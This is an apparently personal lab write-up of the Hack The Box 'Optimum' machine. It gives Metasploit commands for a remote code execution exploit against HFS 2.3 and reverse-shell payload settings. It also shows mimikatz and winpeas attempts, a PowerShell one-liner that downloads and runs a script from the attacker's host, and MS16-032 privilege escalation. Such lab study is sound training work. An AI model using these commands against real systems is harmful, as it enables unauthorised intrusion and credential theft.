---
layout: post
title: "optimum"
date: 2025-09-11 
categories: OSCP Playlist
---
# optimum

# Summary

- metasploit to get reverse shell
- sysinfo to find architecture of Windows
- Added Find-AllVulns to Sherlock.sp1, and used downloadString to execute from powershell
- search exploit in metasploit to escalate privilege

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/optimum 10.10.10.8

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Searching up the version of HttpFileServer httpd 2.3 on Google reveal RCE exploit: https://www.exploit-db.com/exploits/39161

The same exploit can be found in metasploit. Let’s use that:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec

set LHOST tun0
set RHOSTS 10.10.10.8
set SRVPORT 8081
run
```

We now have a meterpreter session:

![image.png]({{ site.baseurl }}/assets/optimum/image.png)

Let’s get a shell and see if there are any saved creds:

```bash
cmdkey /list

Currently stored credentials:

* NONE *
```

Let’s upload mimikatz and see if there are any credentials in memory.  On the meterpreter shell:

```bash
upload mimikatz.exe
.\mimikatz.exe

privilege::debug
```

We do not have enough permissions. Let’s upload winpeas:

```bash
upload winpeas.exe
shell
.\winpeas.exe
```

It crashes. 

At this point, let’s just use metasploit’s exploit suggester. First let’s find out its architecture:

```bash
sysinfo 

Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

It’s x64 architecture. Let’s try using exploit suggester:

```bash
search suggester
use 0
set SESSION 1
run

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!                                                                                    
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

```bash
set LHOST tun0 
set LPORT 9001
set SESSION 1
set payload windows/x64/meterpreter/reverse_tcp
run

```

None of it works as the suggester is not good at finding x64 exploits.

Now there is 3 ways of finding an exploit that works. First is finding the hot fix and search up vulnerabilities around the date of the hot fix. You can get hotfix by going into a shell and executing:

```bash
systeminfo
```

The next is to bruteforce search exploits on metasploit, searching for x64 exploits

```bash
search exploit/windows/local

   20   exploit/windows/local/cve_2017_8464_lnk_lpe                              2017-06-13       great      Yes    LNK Code Execution Vulnerability
   21     \_ target: Windows x64                                                 .                .          .      .
   22     \_ target: Windows x86
   46   exploit/windows/local/ms16_032_secondary_logon_handle_privesc            2016-03-21       normal     Yes    MS16-032 Secondary Logon Handle Privilege Escalation
   47     \_ target: Windows x86                                                 .                .          .      .
   48     \_ target: Windows x64
```

The third would be to upload Sherlock.ps1 onto the target. Sherlock will recommend exploits with a higher chance of success:

```bash
upload Sherlock.ps1
shell
powershell Import-Module .\Sherlock.ps1
Find-AllVulns
```

Did not work. Maybe we can host a python server and execute straight away form memory. First we need to add the line Find-AllVulns at the end of the Sherlock script. Then

```bash
#on attack box
python3 -m http.server 8002

powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.7:8002/Sherlock.ps1')
```

It worked:

```bash
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

```

Now we have the CVE and MSBulletin, we can use metasploit to search them up:

```bash
search MS16-032

   #  Name                                                           Disclosure Date  Rank    Check  Description
   -  ----                                                           ---------------  ----    -----  -----------
   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation
   1    \_ target: Windows x86                                       .                .       .      .
   2    \_ target: Windows x64 
```

```bash
set LHOST tun0 
set LPORT 9001
set SESSION 1
set payload windows/x64/meterpreter/reverse_tcp
run

```

It worked:

![image.png]({{ site.baseurl }}/assets/optimum/image%201.png)